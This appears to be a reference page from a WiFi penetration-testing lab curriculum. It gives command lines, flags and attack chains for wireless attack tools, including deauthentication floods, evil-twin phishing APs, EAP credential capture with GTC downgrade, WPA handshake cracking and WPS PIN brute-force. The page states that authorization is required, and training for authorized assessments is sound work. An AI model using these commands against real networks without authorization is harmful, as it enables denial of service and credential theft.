Section 02

🔌 Setup Tools

Before any wireless attack or assessment can begin, the adapter must be placed into monitor mode and its state verified. These two tools are prerequisites for every subsequent phase of the WiFi Arsenal workflow.

airmon-ng
Setup

The standard utility for enabling and disabling monitor mode on Linux wireless adapters. Monitor mode allows the NIC to capture all nearby 802.11 frames regardless of the BSSID destination — required for airodump-ng and aireplay-ng. Also identifies and kills interfering processes (NetworkManager, wpa_supplicant) that prevent successful mode switching.

# Check adapter and list any interfering processes $ sudo airmon-ng check wlan0 # Kill interfering processes, then enable monitor mode $ sudo airmon-ng check kill $ sudo airmon-ng start wlan0 # Creates wlan0mon (or wlan0 with mode=monitor on some adapters) # Start on a specific channel (reduces hopping noise) $ sudo airmon-ng start wlan0 6 # Disable monitor mode and restore managed mode $ sudo airmon-ng stop wlan0mon
Flag / ArgumentEffect
start <iface>Enable monitor mode, creates <iface>mon
stop <iface>Disable monitor mode, restore managed
check <iface>List processes that may interfere
check killAutomatically terminate interfering processes
start <iface> <ch>Enable monitor mode fixed to channel <ch>
Lab 00 Lab 01 Lab 02 All Labs
iwconfig
Setup

The Linux wireless extensions configuration tool. Used to inspect and set wireless adapter parameters: mode, ESSID, frequency, TX power, and RTS threshold. In the assessment workflow, iwconfig is primarily used to verify that monitor mode is active and that the adapter is on the correct channel before proceeding with capture or injection.

# Show all wireless interfaces and their current state $ iwconfig # Show a specific interface (verify Mode:Monitor) $ iwconfig wlan0mon # Manually set channel (alternative to airmon-ng channel lock) $ sudo iwconfig wlan0mon channel 6 # Set TX power (mW) — use with caution, legal limits vary by region $ sudo iwconfig wlan0mon txpower 30
ParameterEffect
mode MonitorSet adapter to monitor mode (requires interface down first)
channel <N>Lock adapter to channel N (1-14 for 2.4 GHz)
txpower <N>Set transmit power in dBm or mW
essid <SSID>Associate with a specific SSID (managed mode)
Lab 00 All Labs
✓
Monitor Mode Verification Checklist
After running airmon-ng start wlan0, always confirm with iwconfig wlan0mon. Look for Mode:Monitor in the output. If you see Mode:Managed, the driver does not support monitor mode (try a compatible chipset: Atheros AR9271, Ralink RT3070, Realtek RTL8812AU). If you see wlan0mon missing from the output entirely, run airmon-ng check kill first, then retry.
Section 03

🔍 Reconnaissance Tools

Recon tools map the wireless environment before any active engagement begins. The goal is to enumerate access points, identify channels and encryption types, locate associated clients, and flag high-value targets such as WPS-enabled APs.

airodump-ng
Recon

The primary packet capture tool in the Aircrack-ng suite. Displays real-time information about all nearby APs (BSSID, channel, encryption, signal strength, beacon count) and their associated clients. When targeted at a specific BSSID and channel, it writes captured frames to a .cap file and notifies when a WPA handshake is recorded.

# Broad scan — list all visible APs on all channels $ airodump-ng wlan0mon # Target a specific AP: lock to channel 6, filter by BSSID, write capture $ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \ -w capture wlan0mon # 5 GHz band scan $ airodump-ng --band a wlan0mon # Write CSV + PCAP + kismet netxml simultaneously $ airodump-ng -w capture --output-format pcap,csv,kismet wlan0mon
FlagEffect
-c <ch>Lock to channel (stops hopping)
--bssid <MAC>Filter to a single AP
-w <prefix>Write output files (prefix-01.cap, prefix-01.csv)
--band <abg>Scan 2.4 GHz (b/g), 5 GHz (a), or both
--output-formatpcap, csv, gps, kismet, logcsv, netxml
--encrypt <type>Filter display by encryption (WEP, WPA, etc.)
Lab 02
wash
Recon

Part of the Reaver package. Passively scans for WPS-enabled access points by listening for WPS information elements in beacon frames. Displays the AP's BSSID, channel, RSSI, WPS version, and whether WPS is locked. A locked WPS state indicates a previous brute-force attempt was detected by the AP.

# Scan all channels for WPS-enabled APs $ wash -i wlan0mon # Lock to a specific channel $ wash -i wlan0mon -c 6 # Scan with 5 GHz support $ wash -i wlan0mon -5 # Ignore FCS errors (useful with some chipsets) $ wash -i wlan0mon -f
FlagEffect
-i <iface>Specify monitor mode interface
-c <ch>Restrict scan to one channel
-5Include 5 GHz band
-fIgnore FCS errors in captured frames
-o <file>Write results to file
Lab 03
bettercap
Recon / MitM

A modular network attack and monitoring framework written in Go. Its WiFi module performs passive AP discovery, client enumeration, deauthentication, and handshake capture — all with a caplet scripting system that allows automation of multi-step attack sequences. Also supports ARP spoofing, DNS spoofing, and HTTPS interception on the wired side after associating victims.

# Launch bettercap on the monitor interface $ sudo bettercap -iface wlan0mon # Inside the interactive REPL: wifi.recon on # Start passive AP + client discovery wifi.show # Print discovered APs table wifi.deauth AA:BB:CC:DD:EE:FF # Deauth specific AP (all clients) wifi.assoc all # Probe-associate all APs (forces probe responses) # Run a caplet (scripted attack sequence) $ sudo bettercap -iface wlan0mon -caplet wifi-handshake.cap
Command / FlagEffect
-iface <iface>Specify network interface
-caplet <file>Run a caplet script on startup
wifi.recon onEnable WiFi passive scanning module
wifi.showDisplay discovered APs and clients
wifi.deauth <bssid>Send deauth frames to all clients of AP
set wifi.handshakes.fileSet capture file path for handshakes

Section 04

🔫 Attack Tools

Attack tools actively manipulate the wireless environment — injecting frames, creating rogue access points, and delivering phishing payloads. All require explicit authorization on networks you own or are engaged to test.

aireplay-ng
Attack

The frame injection component of the Aircrack-ng suite. Supports nine distinct attack modes: deauthentication (most common), fake authentication, interactive frame replay, ARP request replay (WEP IV acceleration), KoreK chopchop, fragmentation, cafe-latte, deauthentication-based client discovery, and reassociation attacks.

# Attack -0: Send 10 deauth frames to disconnect a client $ aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon # Attack -0: Broadcast deauth (no -c = hit all clients) $ aireplay-ng -0 0 -a AP_MAC wlan0mon # Attack -1: Fake authentication with target AP (for WEP IV injection) $ aireplay-ng -1 0 -a AP_MAC -h MY_MAC wlan0mon # Attack -3: ARP replay attack (accelerate WEP IV collection) $ aireplay-ng -3 -b AP_MAC -h MY_MAC wlan0mon # Test injection capability $ aireplay-ng -9 wlan0mon
Attack ModeDescription
-0 <N>Deauthentication — send N frames (0 = continuous)
-1 <delay>Fake authentication with AP
-2Interactive frame replay
-3ARP request replay (WEP IV flood)
-4KoreK chopchop attack
-5Fragmentation attack
-9Injection test / connectivity check
-a <MAC>Target AP BSSID
-c <MAC>Target client station

EAPHammer
Evil Twin

Purpose-built for attacking WPA-Enterprise networks. Creates a rogue access point that impersonates the target SSID and presents a fraudulent RADIUS / EAP server. When clients attempt to authenticate, EAPHammer captures the challenge and response exchange — yielding NetNTLM or MSCHAPv2 hashes that can be cracked offline with hashcat or john. Also supports GTC downgrade attacks to capture plaintext credentials.

# Set up rogue Enterprise AP and capture EAP credentials $ python3 eaphammer -e CorpWiFi --creds \ --interface wlan0 # Generate self-signed certs (if not pre-generated) $ python3 eaphammer --cert-wizard # SSID with specific auth type and channel $ python3 eaphammer -e CorpWiFi --auth wpa-eap \ --creds --interface wlan0 --channel 6 # GTC downgrade — forces plaintext credential submission $ python3 eaphammer -e CorpWiFi --negotiate gtc-downgrade \ --creds --interface wlan0
FlagEffect
-e <SSID>SSID to broadcast (match target exactly)
--credsEnable EAP credential capture mode
--interface <iface>Wireless interface (managed mode)
--auth wpa-eapSet authentication type
--negotiate gtc-downgradeForce GTC for plaintext credential harvest
--cert-wizardInteractive certificate generation
--channel <N>Broadcast on specified channel
Lab 05
wifiphisher
Evil Twin

Automates evil twin attacks combined with captive portal phishing. Creates a rogue AP, deauthenticates clients from the legitimate AP, and when they associate to the rogue AP presents a convincing web-based phishing page. Ships with multiple built-in phishing scenarios: firmware upgrade prompts, OAuth login pages, and network reconnection forms. Supports two-adapter mode (one for internet, one for the attack).

# Target a specific SSID with wifi_connect scenario, keep target AP beaconing $ sudo wifiphisher -e TargetSSID -p wifi_connect -kB # Firmware upgrade phishing page $ sudo wifiphisher -e TargetSSID -p firmware-upgrade # Specify interfaces explicitly $ sudo wifiphisher -i wlan0 -iAP wlan1 -e TargetSSID \ -p oauth-login # List available phishing scenarios $ sudo wifiphisher --list-scenarios
FlagEffect
-e <SSID>Target SSID to clone
-p <scenario>Phishing scenario: wifi_connect, firmware-upgrade, oauth-login
-kBKeep beaconing the legitimate AP BSSID (lures clients)
-i <iface>Internet-connected interface
-iAP <iface>Interface for the rogue AP
--list-scenariosShow all bundled phishing scenarios
Lab 07
airgeddon
Multi-tool

A bash-based, menu-driven wireless auditing framework that wraps airodump-ng, aireplay-ng, aircrack-ng, hashcat, and other tools in an interactive interface. Provides guided workflows for handshake capture, PMKID attacks, WPS brute-force, evil twin with captive portal, DoS attacks, and more. Useful for structured assessments and students learning the underlying tool chain.

# Launch the interactive menu $ sudo bash airgeddon.sh # The interactive menu provides numbered options: # 2) Put interface in monitor mode # 3) Put interface in managed mode # 5) Handshake/PMKID tools menu # 6) Offline WPA/WPA2 decrypt menu # 7) Evil Twin attack menu # 8) WPS attack menu # 9) WEP attack menu # Headless / non-interactive mode (caplets) $ sudo bash airgeddon.sh --headless
ℹ
Airgeddon Dependencies
Airgeddon auto-detects which tools are installed and disables menu options for missing dependencies. On a fresh Kali install, run sudo apt install reaver hashcat hcxdumptool hcxpcapngtool hostapd dnsmasq before first launch.

🔐 Cracking Tools

Cracking tools perform offline cryptanalysis against captured handshakes and hashes. The choice of tool depends on hardware availability: aircrack-ng is CPU-based and universal, hashcat delivers GPU-accelerated throughput orders of magnitude faster, and john specializes in flexible rule-based and mask attacks for format-specific hashes.

aircrack-ng
Cracking

CPU-based key recovery for WEP and WPA/WPA2. For WEP, performs statistical FMS/KoreK/PTW key recovery from captured IVs — requires ~20,000 IVs for 40-bit WEP. For WPA/WPA2, runs a dictionary attack against the 4-way handshake captured in a .cap file. Can also compute PMKID attacks and export to hashcat format for GPU acceleration.

# WPA2 dictionary attack against a captured handshake $ aircrack-ng -w /usr/share/wordlists/rockyou.txt \ capture-01.cap # Target a specific ESSID when multiple APs are in the capture $ aircrack-ng -w wordlist.txt -e TargetSSID capture-01.cap # WEP key recovery from IVs (no wordlist needed) $ aircrack-ng capture-01.cap # Test handshake validity without cracking $ aircrack-ng capture-01.cap # Specify number of CPUs to use $ aircrack-ng -p 4 -w wordlist.txt capture-01.cap
FlagEffect
-w <file>Wordlist file for dictionary attack
-e <ESSID>Filter to a specific network name
-b <BSSID>Filter to a specific AP MAC address
-p <N>Number of CPU cores to use
-n <bits>WEP key length (64 or 128)

hashcat
Cracking

The industry-standard GPU-accelerated password recovery tool. For WiFi assessments, the relevant hash mode is -m 22000 (WPA-PBKDF2-PMKID+EAPOL), which handles both PMKID captures and traditional 4-way handshakes after conversion with hcxpcapngtool. GPU throughput enables billions of candidate tests per second — vastly faster than CPU-based tools for large wordlists or rule-based mutations.

# WPA2 dictionary attack on hc22000 file $ hashcat -m 22000 -a 0 handshake.hc22000 \ /usr/share/wordlists/rockyou.txt # Rule-based attack (mangling rules for common patterns) $ hashcat -m 22000 -a 0 -r rules/best64.rule \ handshake.hc22000 wordlist.txt # Brute-force mask: 8 digits (e.g. common home router passwords) $ hashcat -m 22000 -a 3 handshake.hc22000 ?d?d?d?d?d?d?d?d # Show cracked passwords from potfile $ hashcat -m 22000 handshake.hc22000 --show # WPA-PMKID only (no handshake required, single frame from AP) $ hashcat -m 22000 -a 0 pmkid.hc22000 wordlist.txt
FlagEffect
-m 22000Hash mode: WPA-PBKDF2-PMKID+EAPOL (replaces deprecated 2500/2501/16800)
-a 0Attack mode: dictionary
-a 3Attack mode: brute-force mask
-r <rules>Apply rule file for password mutations
--showDisplay already-cracked hashes from potfile
-OEnable optimized kernels (limits max password length)
-w 3Workload profile: 3=High (GPU performance)
Lab 01
john
Cracking

John the Ripper — a flexible, format-aware password cracker. In the WiFi Arsenal context it is primarily used to crack NetNTLM hashes captured from EAPHammer enterprise attacks (Lab 06). Supports dictionary, incremental (brute-force), mask, and Markov-chain attack modes. Its auto-detect format recognition simplifies workflow when hash types are unknown.

# Crack NetNTLM hashes captured from EAPHammer (Lab 06) $ john --format=netntlm hashes.txt # Mask attack — all printable ASCII, 6 characters $ john --format=netntlm hashes.txt --mask='?a?a?a?a?a?a' # Dictionary attack with wordlist $ john --format=netntlm --wordlist=rockyou.txt hashes.txt # Show cracked passwords (read from .pot file) $ john hashes.txt --show # List all supported formats $ john --list=formats | grep -i ntlm
FlagEffect
--format=<fmt>Specify hash format (netntlm, md5crypt, sha512crypt, etc.)
--wordlist=<file>Dictionary attack with wordlist file
--mask=<pattern>Mask pattern: ?a=all, ?d=digit, ?l=lower, ?u=upper
--showDisplay cracked passwords from pot file
--incrementalBrute-force incremental mode
--list=formatsList all supported hash formats
Lab 06
⚠
hashcat Mode Note: 22000 vs 2500
Hash mode -m 2500 (WPA/WPA2) is deprecated as of hashcat 6.0. The replacement is -m 22000 (WPA-PBKDF2-PMKID+EAPOL), which handles both PMKID-only captures and full handshake captures in the same unified format. Always use hcxpcapngtool (not cap2hccapx) to convert .cap files to the -m 22000 format. Using the old .hccapx format with the new mode will fail silently.
Section 06

🔢 WPS Attack Tools

Wi-Fi Protected Setup (WPS) was designed to simplify client onboarding but introduced a critical design flaw: the 8-digit PIN is verified in two 4-digit halves, reducing the effective keyspace from 108 to 104 + 103 (11,000 combinations). The Pixie Dust attack further reduces this to an offline computation that can recover the PIN in seconds on vulnerable implementations.

reaver
WPS Attack

The standard WPS PIN brute-force tool. Iterates through all possible WPS PIN values, exploiting the halved keyspace design. With a vulnerable AP, the full brute-force completes in 4-10 hours. With Pixie Dust support (-K), the offline computation recovers the PIN in seconds against APs with weak or static random number generation (common in older Broadcom and Realtek AP chipsets).

# Standard WPS PIN brute-force $ sudo reaver -i wlan0mon -b AP_MAC -vv # Pixie Dust attack first (offline, fast); fall back to brute-force $ sudo reaver -i wlan0mon -b AP_MAC -K -vv # Add delay between attempts to avoid WPS lockout $ sudo reaver -i wlan0mon -b AP_MAC -d 15 -vv # Lock to a specific channel $ sudo reaver -i wlan0mon -b AP_MAC -c 6 -K -vv # Resume a previous session $ sudo reaver -i wlan0mon -b AP_MAC -r 3:15
FlagEffect
-i <iface>Monitor mode interface
-b <BSSID>Target AP MAC address
-KEnable Pixie Dust attack (offline, attempts first)
-vvVery verbose output
-c <ch>Lock to channel (avoids channel hopping delays)
-d <N>Delay N seconds between PIN attempts (avoid lockout)
-r <N:M>Sleep M seconds after every N attempts
-p <PIN>Provide a specific PIN to test
Theory only
pixiewps
WPS Attack

A standalone implementation of the Pixie Dust WPS attack (Dominique Bongard, 2014). Rather than brute-forcing the WPS PIN online, pixiewps recovers it offline by exploiting weak or predictable random number generation in the AP's WPS implementation. Requires capturing the PKE (AP public key), PKR (registrar public key), E-S1, E-S2 nonces, and E-Hash values from the WPS exchange — typically obtained via a single reaver exchange with -K.

# Offline Pixie Dust — provide values captured from WPS exchange $ pixiewps \ -e [PKE] \ -r [PKR] \ -s [E-Hash1] \ -z [E-Hash2] \ -a [AuthKey] \ -n [E-Nonce] # In practice, reaver -K calls pixiewps automatically: $ sudo reaver -i wlan0mon -b AP_MAC -K -vv # reaver captures WPS values and passes them to pixiewps internally
FlagValue Required
-e <PKE>Enrollee (AP) public key (hex)
-r <PKR>Registrar public key (hex)
-s <E-Hash1>First enrollee hash
-z <E-Hash2>Second enrollee hash
-a <AuthKey>Authentication key (from WPS exchange)
-n <E-Nonce>Enrollee nonce
Theory only
⚠
WPS Lockout Behavior
Many APs implement WPS lockout after a configurable number of failed PIN attempts (commonly 3-5 attempts). Lockout periods range from 60 seconds to permanently disabled until a hardware reset. When a lockout is detected, reaver will show WARNING: Detected AP rate limiting. Always attempt Pixie Dust first with -K since it completes in one exchange. Brute-force on locked APs requires patience and the -d and -r delay flags. In scope-limited assessments, verify WPS is enabled in wash before committing to a full brute-force.
Section 07

🔧 Utility Tools

These tools handle format conversion and traffic generation — tasks that support other phases of the workflow rather than performing attacks directly.

hcxpcapngtool
Utility

Converts packet capture files (.cap, .pcapng) to hashcat-compatible formats. The primary output is the .hc22000 format required for hashcat -m 22000 (WPA-PBKDF2-PMKID+EAPOL). Also extracts PMKID values from single-frame captures (no client required), making it the bridge between airodump-ng capture and hashcat cracking.

# Convert airodump-ng .cap to hashcat hc22000 format $ hcxpcapngtool -o output.hc22000 capture-01.cap # Convert with ESSID filter (useful for large multi-AP captures) $ hcxpcapngtool -o output.hc22000 -E essids.txt capture-01.cap # Extract PMKID hashes only (no handshake required) $ hcxpcapngtool -o pmkid.hc22000 --pmkid-only capture-01.cap # Verbose output: shows what was extracted from the capture $ hcxpcapngtool -o output.hc22000 -v capture-01.cap # After conversion: crack with hashcat $ hashcat -m 22000 -a 0 output.hc22000 rockyou.txt
FlagEffect
-o <file>Output file (hc22000 format)
-E <file>Filter by ESSID list
-I <file>Filter by BSSID list
--pmkid-onlyExtract only PMKID records (no EAPOL)
-vVerbose: show extracted hash counts
Lab 02
iperf
Utility

A network bandwidth measurement and traffic generation tool. In the WiFi Arsenal curriculum, iperf is used in Lab 08 to generate high-volume UDP traffic across a WEP-encrypted network, artificially accelerating IV collection for the WEP cracking attack. By flooding the network with UDP datagrams, the number of unique IVs captured per minute increases dramatically, reducing crack time from hours to under two minutes.

# Start iperf server on target host (requires access to one network device) $ iperf -s # Client: flood UDP at 100 Mbps for 60 seconds (IV generation) $ iperf -c TARGET_IP -u -b 100M -t 60 # iperf3 equivalent (newer syntax) $ iperf3 -c TARGET_IP -u -b 100M -t 60 # Bidirectional test $ iperf3 -c TARGET_IP --bidir -t 30
FlagEffect
-sRun as server (listens for incoming connections)
-c <host>Run as client, connect to host
-uUse UDP instead of TCP
-b <N>MTarget bandwidth in Mbps (UDP only)
-t <N>Test duration in seconds
-p <port>Port to use (default: 5201 for iperf3)

WPA2-Personal (PSK) Attack Chain

  • 01airmon-ng start wlan0 → wlan0mon
  • 02airodump-ng wlan0mon → identify target BSSID + channel

WPA2-Enterprise (EAP) Attack Chain

  • 01airodump-ng → identify enterprise AP (WPA EAP in output)
  • 02eaphammer --cert-wizard → generate rogue RADIUS cert
  • 03eaphammer -e <SSID> --creds --interface wlan0
  • 04aireplay-ng -0 0 -a <legit AP> wlan0mon (deauth clients)
  • 05Clients connect to rogue AP; NetNTLM hashes captured
  • 06john --format=netntlm captured_hashes.txt --wordlist=rockyou.txt
WPS Attack Path

WPS Pixie Dust (Fast)

  • 01wash -i wlan0mon → find WPS-enabled APs (WPS: Unlocked)
  • 02reaver -i wlan0mon -b <MAC> -K -vv
  • 03reaver calls pixiewps with captured WPS values
  • 04If vulnerable: PIN recovered offline in < 30 seconds
  • 05reaver uses PIN to retrieve WPA passphrase from AP

WPS PIN Brute-Force (Slow)

  • 01wash -i wlan0mon → confirm WPS not locked
  • 02reaver -i wlan0mon -b <MAC> -d 15 -vv
  • 03Reaver iterates 11,000 PIN combinations
  • 04Duration: 4-10 hours on non-rate-limiting APs
  • 05WPA passphrase retrieved when PIN found
